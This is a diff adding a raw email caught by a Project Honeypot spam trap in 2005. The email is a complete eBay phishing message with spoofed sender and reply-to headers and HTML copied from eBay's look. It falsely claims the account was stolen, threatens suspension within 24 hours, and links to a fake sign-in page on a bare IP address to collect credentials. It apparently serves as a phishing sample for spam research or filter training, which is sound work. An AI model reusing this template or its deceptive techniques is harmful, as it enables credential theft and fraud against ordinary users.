@@ -1,0 +1,75 @@
+Received: from unknown (HELO mail.eclip.com.my) (203.106.36.164)
+  by projecthoneypotmailserver with SMTP; 19 Jul 2005 01:22:05 -0000
+Received: from mail.eclip.com.my (localhost [127.0.0.1])
+	by mail.eclip.com.my (8.12.8/8.12.8) with ESMTP id j6J12pnO014184
+	for <projecthoneypot@projecthoneypot.org>; Tue, 19 Jul 2005 09:02:51 +0800
+Received: (from apache@localhost)
+	by mail.eclip.com.my (8.12.8/8.12.8/Submit) id j6J12o48014182;
+	Tue, 19 Jul 2005 09:02:50 +0800
+Date: Tue, 19 Jul 2005 09:02:50 +0800
+Message-Id: <200507190102.j6J12o48014182@mail.eclip.com.my>
+To: projecthoneypot@projecthoneypot.org
+Subject: eBay NOTICE- Your eBay account has been stolen!
+From: eBay Member <aw-confirm@ebay.com>
+Content-Type: text/html; charset=iso-8859-1
+Reply-To: aw-confirm@yahoo.com
+X-Mailer: PHP/MOZILLA/ETC
+
+<html>
+
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<p>
+<img src="http://pics.ebaystatic.com/aw/pics/navbar/redesign_p1/ebayLogo.gif" border="0" width="150" height="70"><b><font style="line-height: 1.35em" face="Arial, Helvetica, sans-serif" size="2">Update 
+Your Account Information Within 24 Hours</font></b></p>
+<table id="table6" height="87" cellSpacing="0" cellPadding="0" width="742" border="0">
+  <tr>
+    <td style="font-size: x-small; font-family: arial,helvetica,sans-serif" width="742" height="1">
+    <img height="10" alt="spacer" src="http://pics.ebay.com/aw/pics/spacer.gif" width="1"></td>
+  </tr>
+  <tr>
+    <td style="font-size: x-small; font-family: arial,helvetica,sans-serif" vAlign="top" width="742" height="118">
+    <font style="line-height: 1.35em" face="Verdana" size="2">Valued eBay 
+    Member,
+    <p>According to our site policy you will have to confirm that you are the 
+    real owner of the eBay account by completing the following form or else your 
+    account will be suspended within 24 hours for investigations.</p>
+    <p><font style="line-height: 1.35em" color="#ff0000"><b>Never share your 
+    eBay password to anyone! </b></font></p>
+    <p><font style="line-height: 1.35em" size="2">Establish your proof of 
+    identity with ID Verify (free of charge) - an easy way to help others trust 
+    you as their trading partner. The process takes about 5 minutes to complete 
+    and involves updating your eBay information. When you're successfully 
+    verified, you will receive an ID Verify icon
+    <img alt="ID Verify icon" src="http://pics.ebaystatic.com/aw/pics/verify-icon.gif" align="absMiddle" border="0" width="16" height="16"> 
+    in your feedback profile. Currently, the service is only available to 
+    residents of the United States and U.S. territories (Puerto Rico, US Virgin 
+    Islands and Guam.) </font></p>
+    <div>
+      <table cellSpacing="0" cellPadding="0" width="600" border="0">
+        <tr>
+          <td style="font-size: x-small; font-family: arial,helvetica,sans-serif">
+          <a href="http://203.106.36.174/signin.ebay.com.aw-cgi.eBayISAPI.dll.htm" target="_blank">
+          <img alt="eBay logo" hspace="0" src="http://pics.ebay.com/aw/pics/register/HeaderRegister_387x40.gif" border="0" width="387" height="40"></a>
+          <p><span style="FONT-FAMILY: Arial">To update your eBay records </span>
+          <a  target="_blank" href="http://203.106.36.174/signin.ebay.com.aw-cgi.eBayISAPI.dll.htm">
+          <span style="COLOR: red; FONT-FAMILY: Arial">Click here</span></a>:</td>
+        </tr>
+      </table>
+    </div>
+    </font></td>
+  </tr>
+</table>
+
+</body>
+
+</html>
+
+
